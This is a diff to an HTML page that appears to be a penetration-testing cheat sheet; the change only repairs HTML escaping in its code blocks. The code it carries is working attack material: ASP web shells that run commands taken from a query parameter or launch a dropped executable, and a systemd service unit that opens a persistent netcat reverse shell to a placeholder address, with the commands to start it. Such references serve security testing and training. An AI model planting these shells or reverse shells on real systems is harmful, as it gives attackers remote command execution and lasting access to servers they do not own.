@@ -61,13 +61,13 @@ layout: default
         <li>asp shells</li>
         <ul>
         <li>
-            <pre>&#13;&#10;&amp;lt;%&#13;&#10;Set rs = CreateObject(&amp;quot;WScript.Shell&amp;quot;)&#13;&#10;Set cmd = rs.Exec(&amp;quot;cmd /c whoami&amp;quot;)&#13;&#10;o = cmd.StdOut.Readall()&#13;&#10;Response.write(o)&#13;&#10;%&amp;gt;&#13;&#10;            </pre>
+            <pre>&#13;&#10;&lt;%&#13;&#10;Set rs = CreateObject(&quot;WScript.Shell&quot;)&#13;&#10;Set cmd = rs.Exec(&quot;cmd /c whoami&quot;)&#13;&#10;o = cmd.StdOut.Readall()&#13;&#10;Response.write(o)&#13;&#10;%&gt;&#13;&#10;            </pre>
         </li>
         <li>
-            <pre>&#13;&#10;&amp;lt;%response.write CreateObject(&amp;quot;WScript.Shell&amp;quot;).Exec(Request.QueryString(&amp;quot;cmd&amp;quot;)).StdOut.Readall()%&amp;gt;&#13;&#10;            </pre>
+            <pre>&#13;&#10;&lt;%response.write CreateObject(&quot;WScript.Shell&quot;).Exec(Request.QueryString(&quot;cmd&quot;)).StdOut.Readall()%&gt;&#13;&#10;            </pre>
         </li>
         <li>
-            <pre>&#13;&#10;&amp;lt;%&#13;&#10;Dim oS&#13;&#10;On Error Resume Next&#13;&#10;Set oS = Server.CreateObject(&amp;quot;WSCRIPT.SHELL&amp;quot;)&#13;&#10;Call oS.Run(&amp;quot;win.com cmd.exe /c c:\Inetpub\shell4444.exe&amp;quot;,0,True)&#13;&#10;%&amp;gt;&#13;&#10;            </pre>
+            <pre>&#13;&#10;&lt;%&#13;&#10;Dim oS&#13;&#10;On Error Resume Next&#13;&#10;Set oS = Server.CreateObject(&quot;WSCRIPT.SHELL&quot;)&#13;&#10;Call oS.Run(&quot;win.com cmd.exe /c c:\Inetpub\shell4444.exe&quot;,0,True)&#13;&#10;%&gt;&#13;&#10;            </pre>
         </li>
     </ul>
 
@@ -111,7 +111,7 @@ layout: default
     <br>
 
     <h4>Reverse shell using linux service</h4>
-    <pre>&#13;&#10;[Service]&#13;&#10;Type=notify&#13;&#10;ExecStart=/bin/bash -c &amp;#039;nc -e /bin/bash &amp;lt;ip address&amp;gt; &amp;lt;port&amp;gt;&amp;#039;&#13;&#10;KillMode=process&#13;&#10;Restart=on-failure&#13;&#10;RestartSec=40s&#13;&#10;[Install]&#13;&#10;WantedBy=multi-user.target&#13;&#10;&#13;&#10;&#13;&#10;systemctl link &amp;lt;.service file&amp;gt;&#13;&#10;systemctl start &amp;lt;service&amp;gt;&#13;&#10;    </pre>
+    <pre>&#13;&#10;[Service]&#13;&#10;Type=notify&#13;&#10;ExecStart=/bin/bash -c &apos;nc -e /bin/bash &lt;ip address&gt; &lt;port&gt;&apos;&#13;&#10;KillMode=process&#13;&#10;Restart=on-failure&#13;&#10;RestartSec=40s&#13;&#10;[Install]&#13;&#10;WantedBy=multi-user.target&#13;&#10;&#13;&#10;&#13;&#10;systemctl link &lt;.service file&gt;&#13;&#10;systemctl start &lt;service&gt;&#13;&#10;    </pre>
 
     <h2>Windows</h2>
 
